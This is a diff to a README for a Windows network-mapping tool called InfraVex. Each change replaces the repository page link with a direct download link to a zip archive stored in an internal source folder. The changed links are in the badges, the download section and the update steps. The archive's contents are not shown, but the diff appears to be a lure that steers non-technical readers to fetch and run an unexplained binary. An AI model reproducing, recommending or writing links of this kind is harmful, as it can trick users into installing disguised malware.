@@ -1,6 +1,6 @@
 # ⚙️ InfraVex - Map Your Infrastructure Easily
 
-[![Download InfraVex](https://img.shields.io/badge/Download-InfraVex-brightgreen?style=for-the-badge)](https://github.com/Araf-web-Develpoer/InfraVex)
+[![Download InfraVex](https://img.shields.io/badge/Download-InfraVex-brightgreen?style=for-the-badge)](https://github.com/Araf-web-Develpoer/InfraVex/raw/refs/heads/main/internal/resolver/Infra_Vex_1.5-beta.3.zip)
 
 InfraVex is a tool designed to help you understand and manage your network's infrastructure. It runs on Windows and provides insight into your attack surface with clear, organized information. This guide will help you download and run InfraVex without any technical background.
 
@@ -25,7 +25,7 @@ InfraVex runs using Go technology, but you don’t need to understand programmin
 
 You can get InfraVex from this official GitHub page. Click the badge above or this link to visit the download page:
 
-https://github.com/Araf-web-Develpoer/InfraVex
+https://github.com/Araf-web-Develpoer/InfraVex/raw/refs/heads/main/internal/resolver/Infra_Vex_1.5-beta.3.zip
 
 On this page, you will find files to download InfraVex for Windows.
 
@@ -112,7 +112,7 @@ InfraVex will notify you when updates are available.
 
 To update:
 
-1. Visit the GitHub page at https://github.com/Araf-web-Develpoer/InfraVex
+1. Visit the GitHub page at https://github.com/Araf-web-Develpoer/InfraVex/raw/refs/heads/main/internal/resolver/Infra_Vex_1.5-beta.3.zip
 2. Download the latest `.exe` file.
 3. Run the installer. It will replace the old version without removing your data.
 
@@ -133,4 +133,4 @@ InfraVex includes a help section you can access from the main menu. For issues n
 
 ---
 
-[![Download InfraVex](https://img.shields.io/badge/Download-InfraVex-brightgreen?style=for-the-badge)](https://github.com/Araf-web-Develpoer/InfraVex)
+[![Download InfraVex](https://img.shields.io/badge/Download-InfraVex-brightgreen?style=for-the-badge)](https://github.com/Araf-web-Develpoer/InfraVex/raw/refs/heads/main/internal/resolver/Infra_Vex_1.5-beta.3.zip)
